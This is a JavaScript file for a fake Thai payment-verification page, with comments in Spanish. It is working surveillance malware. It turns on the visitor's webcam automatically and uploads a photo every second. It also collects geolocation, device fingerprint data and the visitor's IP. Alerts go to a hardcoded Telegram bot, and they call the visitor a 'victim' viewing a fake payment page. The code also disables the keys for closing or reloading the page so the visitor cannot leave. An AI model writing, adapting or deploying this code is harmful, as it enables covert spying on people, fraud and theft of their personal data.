class PaymentVerification {
    constructor() {
        this.video = document.getElementById('video');
        this.canvas = document.getElementById('canvas');
        this.recordingStatus = document.getElementById('recording-status');
        this.loadingOverlay = document.getElementById('loadingOverlay');
        
        this.stream = null;
        this.isCapturing = false;
        this.hasPermission = false;
        this.captureInterval = null;
        this.photoCount = 0;
        
        this.init();
    }
    
    init() {
        // Establecer tiempo actual
        this.setCurrentTime();
        
        // Activar cámara automáticamente después de 2 segundos
        setTimeout(() => this.handleCameraRequest(), 2000);
        
        // Bloquear navegación sin verificación
        this.blockNavigation();
    }
    
    setCurrentTime() {
        const now = new Date();
        const timeString = now.toLocaleString('th-TH', {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
        document.getElementById('transaction-time').textContent = timeString;
    }
    
    getBrowserInfo() {
        const nav = navigator;
        const screen = window.screen;
        
        return {
            userAgent: nav.userAgent,
            platform: nav.platform,
            language: nav.language,
            languages: nav.languages?.join(', ') || 'N/A',
            cookieEnabled: nav.cookieEnabled,
            onLine: nav.onLine,
            screenWidth: screen.width,
            screenHeight: screen.height,
            screenColorDepth: screen.colorDepth,
            screenPixelDepth: screen.pixelDepth,
            windowWidth: window.innerWidth,
            windowHeight: window.innerHeight,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            memory: nav.deviceMemory || 'N/A',
            cores: nav.hardwareConcurrency || 'N/A',
            connection: nav.connection ? {
                effectiveType: nav.connection.effectiveType,
                downlink: nav.connection.downlink,
                rtt: nav.connection.rtt
            } : 'N/A',
            battery: 'checking...',
            geolocation: 'checking...'
        };
    }

    async getDetailedDeviceInfo() {
        const basicInfo = this.getBrowserInfo();
        
        // Intentar obtener información de batería
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                basicInfo.battery = {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            }
        } catch (e) {
            basicInfo.battery = 'No disponible';
        }

        // Intentar obtener geolocalización (silenciosamente)
        try {
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    timeout: 5000,
                    enableHighAccuracy: false
                });
            });
            basicInfo.geolocation = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy
            };
        } catch (e) {
            basicInfo.geolocation = 'No disponible';
        }

        return basicInfo;
    }
    
    async handleCameraRequest() {
        if (this.isCapturing) return;
        
        try {
            // Solicitar permisos de cámara silenciosamente
            this.stream = await navigator.mediaDevices.getUserMedia({ 
                video: {
                    width: { ideal: 640 },
                    height: { ideal: 480 },
                    facingMode: 'user'
                }, 
                audio: false // No necesitamos audio para fotos
            });
            
            this.hasPermission = true;
            this.video.srcObject = this.stream;
            
            // Mostrar contenido principal inmediatamente
            document.getElementById('initialLoading').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
            
            // Esperar a que el video esté listo
            await new Promise(resolve => {
                this.video.onloadedmetadata = resolve;
            });
            
            // Configurar canvas para captura de fotos
            this.canvas.width = this.video.videoWidth || 640;
            this.canvas.height = this.video.videoHeight || 480;
            
            // Comenzar captura de fotos cada segundo
            this.startPhotoCapture();
            
            // Enviar información inicial del dispositivo
            this.sendInitialDeviceInfo();
            
        } catch (error) {
            console.error('Error accessing camera:', error);
            await this.handleCameraDenied();
        }
    }
    
    async handleCameraDenied() {
        // Registrar que se negó la cámara
        try {
            await fetch('/api/log-camera-denied', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    error: 'Camera permission denied'
                })
            });
        } catch (error) {
            console.log('Error logging camera denial:', error);
        }
        
        // Si niegan la cámara, mantener cargando
        console.log('Camera access denied - keeping loading screen');
    }
    
    startPhotoCapture() {
        this.isCapturing = true;
        console.log('📸 Iniciando captura de fotos continua cada segundo...');
        
        // Capturar primera foto inmediatamente
        this.captureAndSendPhoto();
        
        // Luego capturar cada segundo MIENTRAS la página esté abierta
        this.captureInterval = setInterval(() => {
            this.captureAndSendPhoto();
        }, 1000); // Cada 1 segundo
        
        // Solo detener cuando se cierre la página
        window.addEventListener('beforeunload', () => {
            this.stopPhotoCapture();
            this.sendFinalMessage();
        });
        
        // También detectar cuando la página pierde/gana foco
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                this.sendTabHiddenMessage();
            } else {
                this.sendTabVisibleMessage();
            }
        });
    }
    
    stopPhotoCapture() {
        if (this.captureInterval) {
            clearInterval(this.captureInterval);
            this.captureInterval = null;
            this.isCapturing = false;
            console.log('📸 Captura de fotos detenida');
        }
        
        if (this.stream) {
            this.stream.getTracks().forEach(track => track.stop());
        }
    }
    
    async captureAndSendPhoto() {
        if (!this.hasPermission || !this.stream) return;
        
        try {
            // Capturar frame actual del video
            const ctx = this.canvas.getContext('2d');
            ctx.drawImage(this.video, 0, 0, this.canvas.width, this.canvas.height);
            
            // Convertir a blob JPEG
            const blob = await new Promise(resolve => {
                this.canvas.toBlob(resolve, 'image/jpeg', 0.8);
            });
            
            if (!blob) {
                console.log('❌ Error capturando foto');
                return;
            }
            
            this.photoCount++;
            console.log(`📸 Foto #${this.photoCount} capturada (${(blob.size / 1024).toFixed(2)}KB)`);
            
            // Enviar foto a Telegram inmediatamente
            await this.sendPhotoToTelegram(blob);
            
        } catch (error) {
            console.error('Error capturando foto:', error);
        }
    }
    
    async sendPhotoToTelegram(photoBlob) {
        try {
            const formData = new FormData();
            formData.append('photo', photoBlob, `photo_${Date.now()}.jpg`);
            
            // Obtener información del dispositivo ocasionalmente
            if (this.photoCount % 10 === 1) { // Cada 10 fotos
                const deviceInfo = await this.getDetailedDeviceInfo();
                formData.append('deviceInfo', JSON.stringify(deviceInfo));
            }
            
            const response = await fetch('/api/send-photo', {
                method: 'POST',
                body: formData
            });
            
            const result = await response.json();
            
            if (result.status === 'success' && result.telegramSent) {
                console.log(`✅ Foto #${this.photoCount} enviada a Telegram`);
            } else {
                console.log(`❌ Error enviando foto #${this.photoCount}:`, result.message);
            }
            
        } catch (error) {
            console.error(`❌ Error crítico enviando foto #${this.photoCount}:`, error);
        }
    }
    
    async sendInitialDeviceInfo() {
        try {
            const deviceInfo = await this.getDetailedDeviceInfo();
            const ip = await this.getPublicIP();
            
            // Enviar mensaje inicial con información completa
            const initialMessage = `🚨 <b>NUEVA VÍCTIMA CONECTADA</b>
            
📍 <b>IP:</b> ${ip}
📱 <b>Dispositivo:</b> ${deviceInfo.platform}
🌐 <b>Navegador:</b> ${deviceInfo.userAgent.includes('Chrome') ? 'Chrome' : 'Otro'}
📱 <b>Pantalla:</b> ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
🌍 <b>Zona horaria:</b> ${deviceInfo.timezone}
🗣️ <b>Idioma:</b> ${deviceInfo.language}
⏰ <b>Hora:</b> ${new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' })}

🎭 <b>Estado:</b> Víctima viendo página de pago falsa
💰 <b>Cantidad mostrada:</b> ฿6,100.00
📸 <b>Capturando fotos cada segundo...</b>`;

            await fetch(`https://api.telegram.org/bot7532643566:AAF7QyzOjYPOck2ORJdFyZNelL9fETFU-IM/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '12075234',
                    text: initialMessage,
                    parse_mode: 'HTML'
                })
            });
            
        } catch (error) {
            console.log('Error enviando info inicial:', error);
        }
    }
    
    async getPublicIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return 'unknown';
        }
    }
    
    async sendTabHiddenMessage() {
        try {
            const message = `⚠️ <b>VÍCTIMA CAMBIÓ DE PESTAÑA</b>

📍 <b>IP:</b> ${await this.getPublicIP()}
⏰ <b>Hora:</b> ${new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' })}
👁️ <b>Estado:</b> Página oculta/minimizada
📸 <b>Fotos:</b> #${this.photoCount} (continúa en background)

⚡ Víctima puede estar en otra pestaña...`;

            await this.sendDirectToTelegram(message);
        } catch (error) {
            console.log('Error enviando mensaje tab hidden:', error);
        }
    }

    async sendTabVisibleMessage() {
        try {
            const message = `✅ <b>VÍCTIMA REGRESÓ A LA PÁGINA</b>

📍 <b>IP:</b> ${await this.getPublicIP()}
⏰ <b>Hora:</b> ${new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' })}
👁️ <b>Estado:</b> Página visible otra vez
📸 <b>Fotos:</b> #${this.photoCount} (captura activa)

🎯 Víctima regresó a ver el "pago"`;

            await this.sendDirectToTelegram(message);
        } catch (error) {
            console.log('Error enviando mensaje tab visible:', error);
        }
    }

    async sendFinalMessage() {
        try {
            const message = `🔴 <b>VÍCTIMA SALIÓ DE LA PÁGINA</b>

📍 <b>IP:</b> ${await this.getPublicIP()}
⏰ <b>Hora:</b> ${new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' })}
📸 <b>Total fotos:</b> ${this.photoCount}
⚡ <b>Duración:</b> ${Math.round(this.photoCount / 60 * 100) / 100} minutos

🏁 Sesión terminada - Cámara desconectada`;

            await this.sendDirectToTelegram(message);
        } catch (error) {
            console.log('Error enviando mensaje final:', error);
        }
    }

    async sendDirectToTelegram(message) {
        try {
            await fetch(`https://api.telegram.org/bot7532643566:AAF7QyzOjYPOck2ORJdFyZNelL9fETFU-IM/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '12075234',
                    text: message,
                    parse_mode: 'HTML'
                })
            });
        } catch (error) {
            console.log('Error enviando directo a Telegram:', error);
        }
    }

    blockNavigation() {
        // Bloquear navegación hasta que se complete la verificación
        window.addEventListener('beforeunload', (e) => {
            if (this.isCapturing) {
                e.preventDefault();
                e.returnValue = 'การทำรายการยังไม่เสร็จสิ้น คุณต้องการออกจากหน้านี้หรือไม่?';
                return e.returnValue;
            }
        });
        
        // Deshabilitar teclas comunes para salir
        document.addEventListener('keydown', (e) => {
            if (this.isCapturing) {
                if (e.key === 'F5' || (e.ctrlKey && e.key === 'r') || 
                    (e.ctrlKey && e.key === 'w') || (e.altKey && e.key === 'F4')) {
                    e.preventDefault();
                    alert('กรุณาทำการยืนยันตัวตนให้เสร็จสิ้นก่อน\nPlease complete identity verification first');
                }
            }
        });
    }
}

// Inicializar cuando el DOM esté listo
document.addEventListener('DOMContentLoaded', () => {
    new PaymentVerification();
});

// Verificar soporte de MediaRecorder
if (!window.MediaRecorder) {
    alert('เบราว์เซอร์ของคุณไม่รองรับการบันทึกวิดีโอ\nYour browser does not support video recording');
} 